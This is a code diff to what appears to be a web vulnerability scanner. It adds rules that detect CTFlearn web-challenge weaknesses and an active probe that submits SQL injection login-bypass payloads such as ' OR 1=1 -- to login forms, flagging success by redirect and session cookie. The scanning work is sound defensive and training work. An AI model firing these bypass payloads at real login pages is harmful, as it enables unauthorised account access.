@@ -1677,6 +1677,52 @@ function extractPostSqlForms(html: string, origin: string): { action: string; fi
   return forms;
 }
 
+const POST_LOGIN_SQLI_PAYLOADS = ["' OR 1=1 -- ", "admin' -- ", "' OR ''='"];
+
+async function probePostLoginSqlBypass(ctx: RuleContext): Promise<RuleResult | null> {
+  const forms = extractPostSqlForms(ctx.combined, ctx.origin);
+  const fallbacks = ["/login", "/auth/login", "/signin"];
+  const seen = new Set<string>();
+  for (const f of forms) seen.add(f.action);
+  for (const p of fallbacks) {
+    try {
+      seen.add(new URL(p, ctx.origin).toString());
+    } catch {
+      /* ignore */
+    }
+  }
+  for (const action of [...seen].slice(0, 6)) {
+    for (const username of POST_LOGIN_SQLI_PAYLOADS) {
+      const body = new URLSearchParams({ username, password: "x" }).toString();
+      const r = await ctx.probe.get(action, {
+        method: "POST",
+        body,
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        maxBytes: 4096,
+        redirect: "manual"
+      });
+      const loc = r.headers.location || "";
+      const hasSession = r.setCookies.some((c) => /session=/i.test(c));
+      if (r.status >= 301 && r.status <= 303 && /dashboard|home|admin/i.test(loc) && hasSession) {
+        return {
+          fired: true,
+          confidence: 0.92,
+          evidence: {
+            url: action,
+            method: "POST",
+            payload: username.slice(0, 40),
+            redirect: loc.slice(0, 80),
+            note: "POST login accepted SQLi payload — authentication bypass via redirect + session cookie"
+          }
+        };
+      }
+    }
+  }
+  return null;
+}
+
+const postLoginSqlBypass: Rule = async (ctx) => (await probePostLoginSqlBypass(ctx)) ?? NEGATIVE;
+
 async function probePostFormSqlDisclosure(ctx: RuleContext): Promise<RuleResult | null> {
   const forms = extractPostSqlForms(ctx.combined, ctx.origin);
   const fallbacks = ["/SQLI/00.php", "/sqli/00.php", "/login.php", "/auth/login"];
@@ -5392,6 +5438,78 @@ const clientSideCtflearnWebsixEvidence: Rule = async (ctx) => {
   };
 };
 
+// --- CTFlearn Web2 base64 comment challenge (web.ctflearn.com/web2) -------------------
+const CLIENT_CTFLEARN_WEBTWO_RES: { label: string; re: RegExp }[] = [
+  {
+    label: "Web2 challenge title",
+    re: /Web\s*2/i
+  },
+  {
+    label: "POST password form",
+    re: /<form[^>]*method\s*=\s*["']post["'][\s\S]{0,400}?name\s*=\s*["']password["']/i
+  },
+  {
+    label: "Base64 HTML comment credential hint",
+    re: /<!--\s*[A-Za-z0-9+/]{12,}={0,2}\s*-->/
+  },
+  {
+    label: "web.ctflearn.com host",
+    re: /web\.ctflearn\.com/i
+  }
+];
+
+const clientSideCtflearnWebtwoEvidence: Rule = async (ctx) => {
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of CLIENT_CTFLEARN_WEBTWO_RES) {
+    const m = ctx.combined.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  if (!/Web\s*2|web\.ctflearn\.com/i.test(ctx.combined)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 3 ? 0.9 : 0.87,
+    evidence: {
+      markers: hits.slice(0, 4),
+      note: "CTFlearn Web2 hides the password in a base64 HTML comment beside a POST login form — credential disclosure training surface"
+    }
+  };
+};
+
+// --- CTFlearn Web7 calculator eval challenge (web.ctflearn.com/web7) ------------------
+const CLIENT_CTFLEARN_WEBSEVEN_RES: { label: string; re: RegExp }[] = [
+  {
+    label: "Calculator expression input",
+    re: /name\s*=\s*["']expression["']/i
+  },
+  {
+    label: "eval() on calculator display value",
+    re: /eval\s*\(\s*document\.getElementById\s*\(\s*["']d["']\s*\)\.value\s*\)/i
+  },
+  {
+    label: "web.ctflearn.com host",
+    re: /web\.ctflearn\.com/i
+  }
+];
+
+const clientSideCtflearnWebsevenEvidence: Rule = async (ctx) => {
+  const hits: { label: string; sample: string }[] = [];
+  for (const { label, re } of CLIENT_CTFLEARN_WEBSEVEN_RES) {
+    const m = ctx.combined.match(re);
+    if (m) hits.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (hits.length < 2) return NEGATIVE;
+  if (!/expression|calc\.js|web\.ctflearn\.com/i.test(ctx.combined)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hits.length >= 3 ? 0.9 : 0.87,
+    evidence: {
+      markers: hits.slice(0, 3),
+      note: "CTFlearn Web7 calculator passes user expression input to eval() — DOM code injection training surface"
+    }
+  };
+};
+
 async function probePhpStrcmpArrayBypass(ctx: RuleContext): Promise<RuleResult | null> {
   const hasHint = /<!--\s*source\s+at\s+source\.txt\s*-->/i.test(ctx.combined);
   const pagePath = new URL(ctx.home.finalUrl || ctx.origin).pathname || "/";
@@ -6534,6 +6652,21 @@ const htmlCommentCredentialDisclosure: Rule = async (ctx) => {
         sample: bare[0].slice(0, 220).replace(/\s+/g, " ").trim(),
         secretHint: secret?.slice(0, 24),
         note: "HTML comment beside password form discloses credential viewable in page source"
+      }
+    };
+  }
+  const base64FormSecret =
+    /<form[\s\S]{0,900}?name\s*=\s*["']password["'][\s\S]{0,1400}?<!--\s*[A-Za-z0-9+/]{12,}={0,2}\s*-->/i;
+  const b64 = ctx.combined.match(base64FormSecret);
+  if (b64) {
+    const secret = b64[0].match(/<!--\s*([A-Za-z0-9+/]{12,}={0,2})\s*-->/)?.[1];
+    return {
+      fired: true,
+      confidence: 0.87,
+      evidence: {
+        sample: b64[0].slice(0, 220).replace(/\s+/g, " ").trim(),
+        secretHint: secret?.slice(0, 24),
+        note: "HTML comment beside password form discloses base64-encoded credential viewable in page source"
       }
     };
   }
@@ -10852,6 +10985,7 @@ export const RULES: Record<string, Rule> = {
   nextDataSensitiveKeys,
   unauthenticatedApiRoutes,
   sqlErrorDisclosure,
+  postLoginSqlBypass,
   sstiTemplateInjection,
   clientSideXorAuthEvidence,
   unauthenticatedAdminEndpoint,
@@ -10898,8 +11032,10 @@ export const RULES: Record<string, Rule> = {
   clientSideCtflearnWebfourEvidence,
   clientSideCtflearnWebeightEvidence,
   clientSideCtflearnWeboneEvidence,
+  clientSideCtflearnWebtwoEvidence,
   clientSideCtflearnWebthreeEvidence,
   clientSideCtflearnWebsixEvidence,
+  clientSideCtflearnWebsevenEvidence,
   phpStrcmpArrayBypass,
   clientSideWechallEvidence,
   clientSideAppsecMasterEvidence,
